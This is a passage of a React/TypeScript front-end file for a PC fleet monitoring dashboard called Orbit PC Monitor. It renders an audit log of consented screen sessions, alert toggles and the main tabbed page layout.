              <strong>No screen sessions recorded yet</strong>
              <span>Sessions requested from the Client tab are permanently logged here.</span>
            </div>
          ) : (
            <div className="audit-table-wrap">
              <table className="audit-table">
                <thead>
                  <tr>
                    <th>PC Hostname</th>
                    <th>Operator</th>
                    <th>Status</th>
                    <th>Requested</th>
                    <th>Approved</th>
                    <th>Ended</th>
                    <th>Duration</th>
                  </tr>
                </thead>
                <tbody>
                  {audits.map((a) => (
                    <tr key={a.id}>
                      <td><strong>{a.hostname}</strong></td>
                      <td>{a.operatorName}</td>
                      <td>
                        <StatusPill tone={a.state === "approved" ? "green" : a.state === "ended" ? "blue" : "coral"}>
                          {a.state}
                        </StatusPill>
                      </td>
                      <td>{formatDate(a.requestedAt)}</td>
                      <td>{formatDate(a.approvedAt)}</td>
                      <td>{formatDate(a.endedAt)}</td>
                      <td>{a.durationSeconds ? `${a.durationSeconds}s` : "—"}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </article>

        <article className="panel settings-panel reveal" style={{ "--delay": "120ms" } as React.CSSProperties}>
          <div className="panel-heading">
            <div><div className="panel-kicker">Policy controls</div><h3>Notification & alerts</h3></div>
            <span className="settings-count"><Bell size={14} /> 2 active</span>
          </div>
          <div className="preference-list">
            <div className="preference-row">
              <span className="preference-icon"><Bell size={16} /></span>
              <span><strong>Performance alerts</strong><small>Notify when PC CPU or memory stays critical.</small></span>
              <button className={`toggle ${notifications ? "toggle-on" : ""}`} onClick={() => { const next = !notifications; setNotifications(next); localStorage.setItem("orbit-alert-performance", next ? "on" : "off"); }} aria-label="Toggle performance threshold alerts"><span /></button>
            </div>
            <div className="preference-row">
              <span className="preference-icon"><CircleOff size={16} /></span>
              <span><strong>Offline alerts</strong><small>Notify if an enrolled PC misses 5 consecutive heartbeats.</small></span>
              <button className={`toggle ${offline ? "toggle-on" : ""}`} onClick={() => { const next = !offline; setOffline(next); localStorage.setItem("orbit-alert-offline", next ? "on" : "off"); }} aria-label="Toggle offline device alerts"><span /></button>
            </div>
          </div>
          <div className="security-note">
            <ShieldCheck size={16} />
            <span><strong>Compliance & Transparency</strong><small>All remote screen monitoring sessions require mutual consent and are recorded in the audit log above.</small></span>
          </div>
        </article>
      </section>
    </>
  );
}

export default function Home() {
  const { user, loading } = useAuth();
  const [activeTab, setActiveTab] = useState<Tab>("Client");
  const [mobileOpen, setMobileOpen] = useState(false);
  const [searchQuery, setSearchQuery] = useState("");
  const [commandOpen, setCommandOpen] = useState(false);

  useEffect(() => {
    const handleShortcut = (event: KeyboardEvent) => {
      if ((event.metaKey || event.ctrlKey) && event.key.toLowerCase() === "k") { event.preventDefault(); setCommandOpen(true); }
      if (event.key === "Escape") setCommandOpen(false);
    };
    window.addEventListener("keydown", handleShortcut);
    return () => window.removeEventListener("keydown", handleShortcut);
  }, []);

  return (
    <div className="app-shell">
      <Sidebar activeTab={activeTab} onSelect={setActiveTab} mobileOpen={mobileOpen} onClose={() => setMobileOpen(false)} />
      <main className="main-content">
        <Topbar activeTab={activeTab} onOpenMenu={() => setMobileOpen(true)} onOpenCommand={() => setCommandOpen(true)} searchQuery={searchQuery} onSearch={setSearchQuery} />
        <div className="page-content">
          {activeTab === "Client" && <FleetOverview onSelect={setActiveTab} searchQuery={searchQuery} />}
          {activeTab === "Build" && <BuildPage onSelect={setActiveTab} />}
          {activeTab === "Settings" && <SettingsPage />}
        </div>
        <footer className="page-footer">
          <span><span className="footer-status" />All monitoring systems operational</span>
          <span>Orbit PC Monitor <span className="footer-separator">·</span> v2.5.0 (Telemetry & controls)</span>
        </footer>
      </main>
      <CommandPalette open={commandOpen} onClose={() => setCommandOpen(false)} onSelect={(tab) => setActiveTab(tab)} onRefresh={() => window.location.reload()} />
    </div>
  );
}
